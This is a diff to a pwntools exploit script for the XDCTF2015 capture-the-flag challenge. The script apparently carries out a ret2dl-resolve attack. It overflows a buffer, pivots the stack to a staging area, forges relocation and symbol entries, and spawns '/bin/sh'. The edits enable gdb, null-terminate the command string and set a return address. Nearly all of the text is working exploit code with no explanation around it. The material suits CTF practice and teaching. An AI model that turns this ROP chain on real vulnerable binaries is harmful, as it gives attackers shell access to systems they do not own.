@@ -22,7 +22,7 @@ io = process(target)
 io.recvuntil('Welcome to XDCTF2015~!/n')
 context(log_level="debug")
 # io.gdb_hint([0x80484bd])
-# gdb.attach(io,"b*0x80484bd\nc")
+gdb.attach(io,"b*0x80485e6\nc")
 buf1  = 'A' * offset
 buf1 += p32(addr_plt_read)
 buf1 += p32(pppop_ret)
@@ -34,7 +34,7 @@ buf1 += p32(base_stage)
 buf1 += p32(leave_ret)
 io.sendline(buf1)
 raw_input()
-cmd = "/bin/sh"
+cmd = "/bin/sh\x00"
 addr_plt_start = 0x80483b0 # objdump -d -j.plt bof
 addr_rel_plt   = 0x804834c # objdump -s -j.rel.plt a.out
 index_offset   = (base_stage + 28) - addr_rel_plt
@@ -56,7 +56,7 @@ fake_sym       = p32(st_name) + p32(0) + p32(0) + p32(0x12)
 buf2 = 'AAAA'
 buf2 += p32(addr_plt_start)
 buf2 += p32(index_offset)
-buf2 += 'AAAA'
+buf2 += p32(0x08048546)
 buf2 += p32(base_stage+80)
 buf2 += p32(0)
 buf2 += p32(0)
